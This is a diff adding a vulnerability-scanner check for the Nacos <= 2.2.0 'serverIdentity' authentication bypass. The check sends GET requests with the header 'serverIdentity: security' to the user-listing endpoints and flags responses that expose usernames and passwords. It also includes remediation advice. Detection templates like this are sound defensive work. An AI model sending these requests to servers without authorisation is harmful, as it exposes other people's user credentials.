@@ -1,0 +1,27 @@
+metadata:
+    language: v1-beta
+    name: "Nacos ServerIdentity Bypass"
+    description: "Nacos <= 2.2.0 - ServerIdentity Bypass"
+    tags: "Unauthorized","Nacos"
+    author: "JaveleyQAQ"
+
+run for each:
+    nacos_detect = 
+        "/nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken=",
+        "/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken="
+
+given host then
+    send request called nacos:
+        method: "GET"
+        path: {nacos_detect}
+        appending headers:
+            "serverIdentity": "security"
+
+    if {nacos.response.status_code} is "200" and "application/json" in {nacos.response.headers} and "\"username\":" in {nacos.response.body} and "\"password\":" in {nacos.response.body} then
+        report issue:
+            severity: high
+            confidence: certain
+            detail: `Nacos <= 2.2.0 platform adds "serverIdentity: security" to the header to bypass authentication and view the list of users. \nhttps://github.com/MrWQ/vulnerability-paper/blob/55e4dca8b537b93c6b90008af2f7eddd68271f2c/bugs/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E8%BF%BD%E8%BF%87%E7%9A%84%20Nacos.md`
+            remediation: `Change the default value of token.secret.key in the application.properties file. Refer to https://nacos.io/zh-cn/docs/v2/guide/user/auth.html`
+    end if
+
